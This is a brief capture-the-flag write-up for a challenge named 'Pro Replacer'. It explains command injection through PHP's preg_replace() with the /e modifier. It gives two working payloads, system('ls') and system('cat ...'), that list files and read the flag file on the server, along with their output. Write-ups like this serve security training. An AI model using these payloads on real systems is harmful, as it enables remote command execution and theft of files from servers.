# Name: Pro Replacer

## Vulnerability

Use of `preg_replace()` function in PHP 5.5 that leads to command injection.

## Exploit

The server executes the `preg_replace()` function with unsanitized parameters from the user.

If you use the `/e` modifier at the end of the regex, the next of the command will be treated as PHP code.
In this way you can execute shell commands.

**Payload 1**

Needle: `m/e`

Replacement: `system('ls')`

Haystack: `m`


Output: `index.php wRtu3ND38n8RNgez`

**Payload 2**

Needle: `m/e`

Replacement: `system('cat wRtu3ND38n8RNgez')`

Haystack: `m`


Output: the flag

Exploit in `../sol/solution.sh`.
